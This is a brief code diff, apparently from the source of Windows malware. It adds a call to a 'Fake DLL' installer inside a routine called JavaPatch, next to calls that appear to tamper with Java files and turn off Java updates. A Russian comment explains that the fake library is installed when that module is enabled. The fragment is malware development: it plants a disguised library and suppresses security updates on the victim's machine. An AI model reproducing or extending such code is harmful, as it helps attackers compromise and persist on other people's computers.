@@ -985,6 +985,15 @@ bool JavaPatchInstalled()
 
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
+
+	// При включенном модуле инсталяции Fake DLL
+	// запускаем установку библиотеки
+	#ifdef FakeDllInstallerH
+        FDI::Install();
+	#endif
+
+
+
 	WJFile();
 	OffUpdateJava();
 
